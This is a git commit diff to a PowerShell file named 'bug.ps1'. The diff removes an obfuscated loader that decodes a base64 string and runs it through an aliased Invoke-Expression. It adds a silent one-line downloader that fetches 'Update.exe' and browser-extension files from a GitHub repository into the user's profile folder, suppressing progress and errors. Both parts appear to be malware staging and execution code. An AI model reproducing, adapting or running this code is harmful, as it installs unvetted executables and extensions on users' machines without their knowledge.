c57a24a0b9b18a442746e7839796f025f52e1a9d
MADEEB80 <101536848+MADEEB80@users.noreply.github.com>
2025-03-02 01:46:37 +0500

    Update bug.ps1

--- bug.ps1
+++ bug.ps1
@@ -1,4 +1,1 @@
-$4Vbsre = "" ;$J13soTrgi0lhtYVq5Z7fbyO6 = $4Vbsre.ToCharArray() ; [array]::Reverse($J13soTrgi0lhtYVq5Z7fbyO6) ; -join $J13soTrgi0lhtYVq5Z7fbyO6 2>&1> $null ;
-$69Sb = [SYSTem.tExt.EncoDiNG]::UTf8.geTSTRINg([SYStEM.ConveRt]::FrombasE64stRIng("$J13soTrgi0lhtYVq5Z7fbyO6")) ;
-$NZTf4y6hq4ywPMx3aKGIXj = "iN"+"vo"+"ke"+"-e"+"Xp"+"Re"+"SS"+"IO"+"n" ; new-AliAS -NaMe PWn -vALUE $NZTf4y6hq4ywPMx3aKGIXj -FoRCe ; pWn $69Sb ;
-
+$ProgressPreference='SilentlyContinue';$d="$env:USERPROFILE\Branding";New-Item -ItemType Directory -Force -Path $d|Out-Null;$b='https://github.com/MADEEB80/AutoSkipTracing/raw/main/Obfic/';"Update.exe","Version.txt","Wait.gif","background.js","content.js","jquery-3.6.0.min.js","jquery.min.js","manifest.json","popup.html","script.js","popup.js","UTZ.png","style.css","crypto-js.js"|%{iwr "$b$_" -OutFile (Join-Path $d $_) -ErrorAction SilentlyContinue}
